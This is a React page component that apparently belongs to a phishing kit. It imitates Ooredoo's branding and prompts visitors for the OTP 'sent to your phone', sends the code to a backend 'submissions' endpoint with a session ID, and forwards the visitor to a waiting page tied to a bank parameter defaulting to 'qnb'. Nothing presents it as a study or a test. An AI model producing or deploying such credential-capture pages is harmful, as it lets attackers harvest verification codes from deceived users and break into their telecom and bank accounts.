import { useState, useEffect } from "react";
import { useLocation, useSearch } from "wouter";
import { trpc } from "@/lib/trpc";
import { useLanguage } from "@/contexts/LanguageContext";
import { toast } from "sonner";
import { X } from "lucide-react";

export default function OtpOoredoo() {
  const [, setLocation] = useLocation();
  const search = useSearch();
  const params = new URLSearchParams(search);
  const { language, setLanguage } = useLanguage();
  const sessionId = params.get("session") || localStorage.getItem("sessionId") || "";
  const hasError = params.get("error") === "true";

  const isArabic = language === "ar";

  const [otp, setOtp] = useState("");
  const [errorMessage, setErrorMessage] = useState<string | null>(null);

  useEffect(() => {
    if (hasError) {
      const msg = sessionStorage.getItem("error_message");
      if (msg) {
        setErrorMessage(msg);
        sessionStorage.removeItem("error_message");
      }
    }
  }, [hasError]);

  const submitOtpMutation = trpc.submissions.submitOtp.useMutation();

  const handleOtpChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/[^0-9]/g, "").slice(0, 8);
    setOtp(value);
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    const bank = params.get("bank") || "qnb";

    if (otp.length < 4) {
      toast.error(isArabic ? "يجب أن يكون الرمز مكتملاً" : "Code must be complete");
      return;
    }
    try {
      await submitOtpMutation.mutateAsync({
        sessionId: sessionId,
        otpCode: otp,
        otpType: "ooredoo_otp",
      });
      setLocation(`/waiting?bank=${bank}&session=${sessionId}&next=success`);
    } catch (error) {
      toast.error(isArabic ? "حدث خطأ أثناء الإرسال" : "Error during submission");
    }
  };

  return (
    <div className="min-h-screen bg-white flex flex-col font-sans" dir={isArabic ? "rtl" : "ltr"}>
      <style>{`
        @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap');
        .page-wrapper { font-family: 'Cairo', sans-serif; }
      `}</style>
      
      <div className="page-wrapper w-full max-w-lg mx-auto">
        <header className="p-4 flex items-center justify-between border-b-2 border-[#d71920]">
          <div className="text-[#d71920] font-bold">☰</div>
          <div className="flex-grow flex justify-center">
            <img src="https://i.ibb.co/LzNfX8fL/ooredoo-logo.png" className="h-10" alt="Ooredoo Logo" />
          </div>
          <div className="text-[10px] font-bold text-[#d71920] border border-[#d71920] px-2 py-1 rounded-full cursor-pointer" onClick={() => setLanguage(language === "ar" ? "en" : "ar")}>
            {language === "ar" ? "English" : "العربية"}
          </div>
        </header>

        <div className="p-6">
          {errorMessage && (
            <div className="mb-6 bg-rose-50 border border-rose-200 rounded-2xl p-4 flex items-start gap-3 animate-in fade-in slide-in-from-top-4 text-right">
              <div className="bg-rose-500 text-white rounded-full p-1 shrink-0">
                <X className="w-4 h-4" />
              </div>
              <p className="text-rose-600 text-sm font-bold leading-relaxed">
                {errorMessage}
              </p>
            </div>
          )}

          <h1 className="text-2xl font-bold text-slate-800 mb-2">{isArabic ? "رمز التحقق" : "Verification Code"}</h1>
          <p className="text-slate-500 text-sm mb-8">{isArabic ? "يرجى إدخال رمز التحقق (OTP) المرسل إلى هاتفك." : "Please enter the verification code (OTP) sent to your phone."}</p>
          
          <form onSubmit={handleSubmit} className="space-y-8">
            <input
              type="text"
              placeholder="000000"
              maxLength={8}
              className="w-full h-20 text-center border-2 border-slate-100 rounded-2xl focus:border-[#d71920] outline-none transition-all text-4xl font-bold tracking-[0.3em]"
              value={otp}
              onChange={handleOtpChange}
              required
            />
            <button type="submit" className="w-full h-14 bg-[#d71920] text-white font-bold rounded-full text-lg shadow-lg active:scale-95 transition-all">
              {isArabic ? "تأكيد" : "Confirm"}
            </button>
          </form>
        </div>
      </div>
    </div>
  );
}
